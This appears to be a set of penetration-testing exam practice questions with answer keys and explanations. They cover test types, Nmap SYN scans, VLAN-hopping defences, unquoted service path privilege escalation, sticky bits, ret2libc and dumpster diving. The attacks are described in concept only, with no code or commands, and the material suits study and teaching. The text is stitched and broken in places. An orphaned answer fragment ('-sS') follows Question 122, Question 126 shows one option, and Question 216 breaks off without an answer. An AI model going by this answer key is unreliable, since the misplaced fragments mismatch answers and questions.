QUESTION 71

A potential customer is looking to test the security of its network. One of the customer’s primary concerns is the security awareness of its employees. Which type of test would you recommend that the company perform as part of the penetration test?

A.  Network testing 
B.  Wireless testing 
C.  Social engineering testing 
D.  Web application testing 

Correct Answer: C

Explination: The majority of compromises today start with some kind of social engineering attack. This could be a phone call, an email, a website, an SMS message, and so on. For this reason, it is important to test how your employees handle these types of situations. This type of test is often omitted from the scope of a penetration testing engagement mainly because it primarily involves testing people instead of the technology. In most cases, management does not agree with this type of approach. However, it is important to get a real-world view of the latest attack methods. The result of a social engineering test should be to assess the security awareness program so that you can enhance it. It should not be to identify individuals who fail the test. One of the tool is the Social-Engineer Toolkit (SET), created by Dave Kennedy. This is a great tool for performing social engineering testing campaigns.

QUESTION 75

Your company has an Internet-facing website that is critical to its daily business. Which type of penetration test would you prioritize?

A.  Wireless test 
B.  Network test 
C.  Web application test 
D.  Social engineering test 

Correct Answer: C

Explination: Web application testing focuses on testing for security weaknesses in a web application. These weaknesses can include misconfigurations, input validation issues, injection issues, and logic flaws. Because a web application is typically built on a web server with a back-end database, the testing scope would normally include the database as well. But it would focus on gaining access to that supporting database through the web application compromise. A great resource that we mentioned a number of times in this book is the Open Web Application Security Project.

QUESTION 82

You are hired to complete a penetration test. The customer gives you only a domain name and IP address as the target information. Which type of penetration test is the customer asking you to perform?

A.  Black-box test 
B.  Brown-box test 
C.  White-box test 
D.  Gray-box test 

Correct Answer: A

Explination: With a black-box penetration test, the tester is provided with only a very limited amount of information. For instance, the tester may only be provided the domain names and IP addresses that are in scope for a particular target. The idea of this type of limitation is to have the tester take the perspective of an external attacker. Typically, an attacker would first determine a target and then begin to gather information about the target, using public information, and gaining more and more information to use in attacks. The tester would not have prior knowledge of the targets’ organization and infrastructure. Another aspect of black-box testing is that sometimes the network support personnel of the target may not be given information about exactly when the test is taking place. This allows for a defense exercise to take place as well. It also eliminates the issue of a target preparing for the test and not giving a real-world view of how the security posture really looks.

QUESTION 122

An Nmap _________ scan is also known as a “half-open” scan because it doesn’t open a full TCP connection.

A.  TCP 
B.  SYN 
C.  FIN
D.  Ping

Correct Answer: B

Explination: An Nmap SYN scan sends a TCP SYN packet to the TCP port it is probing. This is also referred to as half-open scanning because it doesn’t open a full TCP connection. If the response is a SYN/ACK, this indicates that the port is in a listening state. If the response to the SYN packet is RST (reset), this indicates that the port is closed or not in a listening state. If the SYN probe does not receive any response, Nmap marks it as filtered because it was unable to determine if the port was open or closed.

D.  -sS 

Correct Answer: D

Explination: With an Nmap SYN scan, the tool sends a TCP SYN packet to the TCP port it is probing. This is also referred to as half-open scanning because it doesn’t open a full TCP connection. If the response is a SYN/ACK, this indicates that the port is actually in a listening state. If the response to the SYN packet is a RST (or reset), this indicates that the port is closed or not in a listening state. If the SYN probe does not receive any response, Nmap marks it as filtered because it was unable to determine if the port was open or closed.


QUESTION 126

Which of the following Nmap options would you use to perform a TCP connect scan?

A.  -sF

QUESTION 163

Which of the following best practices help protect against VLAN hopping and Layer 2 attacks?

A.  Administratively configure access ports as access ports so that users cannot negotiate a trunk; also disable the negotiation of trunking (that is, do not allow Dynamic Trunking Protocol [DTP]). 
B.  Limit the number of MAC addresses learned on a given port with the port security feature. 
C.  Control Spanning Tree to stop users or unknown devices from manipulating it. You can do so by using the BPDU Guard and Root Guard features. 
D.  All of these 

Correct Answer: D

Explination: The following are a few examples of best practices for securing your infrastructure, including Layer 2: Select an unused VLAN (other than VLAN 1) and use it as the native VLAN for all your trunks. Do not use this native VLAN for any of your enabled access ports. Avoid using VLAN 1 anywhere because it is a default. Administratively configure access ports as access ports so that users cannot negotiate a trunk; also disable the negotiation of trunking (that is, do not allow Dynamic Trunking Protocol [DTP]). Limit the number of MAC addresses learned on a given port with the port security feature. Control Spanning Tree to stop users or unknown devices from manipulating it. You can do so by using the BPDU Guard and Root Guard features. Turn off Cisco Discovery Protocol (CDP) on ports facing untrusted or unknown networks that do not require CDP for anything positive. (CDP operates at Layer 2 and may provide attackers information you would rather not disclose.) On a new switch, shut down all ports and assign them to a VLAN that is not used for anything else other than a parking lot. Then bring up the ports and assign correct VLANs as the ports are allocated and needed.

QUESTION 210

Which of the following functionalities can an attacker abuse to try to elevate privileges if the service is running under SYSTEM privileges?

A.  Unquoted service paths 
B.  Unquoted PowerShell scripts 
C.  Writable SYSTEM services using the GetSystemDirectory function 
D.  Cross-site scripting (XSS) 

Correct Answer: A

Explination: If an executable (application binary) is enclosed in quotation marks (““), Windows knows where to find it. On the contrary, if the path where the application binary is located doesn’t contain any quotation marks, Windows will try to locate it and execute it inside every folder of this path until it finds the executable file. An attacker can abuse this functionality to try to elevate privileges if the service is running under SYSTEM privileges. A service is vulnerable if the path to the executable has a space in the filename and the filename is not wrapped in quotation marks; exploitation requires write permissions to the path before the quotation mark.

QUESTION 214

Which of the following is not true about sticky bits?

A.  A restricted deletion flag, or sticky bit, is a single bit whose interpretation depends on the file type. 
B.  For directories, the sticky bit prevents unprivileged users from removing or renaming a file in the directory unless they own the file or the directory; this is called the restricted deletion flag for the directory, and is commonly found on world-writable directories such as /tmp. 
C.  If the sticky bit is set on a directory, files inside the directory cannot be renamed or removed by the owner of the file, the owner of the directory, or the superuser (even though the modes of the directory might allow such an operation). 
D.  For regular files on some older systems, the sticky bit saves the program's text image on the swap device so it will load more quickly when run. 

Correct Answer: C

Explination: As documented in the chmod man pages, the restricted deletion flag or sticky bit is a single bit whose interpretation depends on the file type. For directories, the sticky bit prevents unprivileged users from removing or renaming a file in the directory unless they own the file or the directory; this is called the restricted deletion flag for the directory, and it is commonly found on world-writable directories such as /tmp. For regular files on some older systems, the sticky bit saves the program’s text image on the swap device so it will load more quickly when run. If the sticky bit is set on a directory, files inside the directory may be renamed or removed only by the owner of the file, the owner of the directory, or the superuser (even though the modes of the directory might allow such an operation); on some systems, any user who can write to a file can also delete it. This feature was added to keep an ordinary user from deleting another user’s files from the /tmp directory.


QUESTION 215

Which of the following is a type of attack in which a subroutine return address on a call stack is replaced by an address of a subroutine that is already present in the executable memory of the process?

A.  Ret2libc 
B.  ASLR bypass 
C.  CPassword 
D.  Sticky-bit attack 

Correct Answer: A

Explination: In return-to-libc or ret2libc, attacks (the predecessor to return-oriented programming [ROP]), a subroutine return address on a call stack is replaced by an address of a subroutine that is already present in the executable memory of the process. This is done to potentially bypass the not-execute (NX) bit Linux feature and allow the attacker to execute arbitrary code. Operating systems that support non-executable stack help protect against code execution after a buffer overflow vulnerability is exploited. On the other hand, this cannot prevent a ret2libc attack because in this attack, only existing executable code is used. Another technique, called stack-smashing protection, can prevent or obstruct code execution exploitation since it can detect the corruption of the stack and may potentially “flush out” the compromised segment.


QUESTION 216

Which of the following involves an unauthorized individual searching and attempting to collect sensitive information from the trash?

A.  Piggybacking 
B.  Fence jumping 
C.  Dumpster diving 
D.  Lockpicking
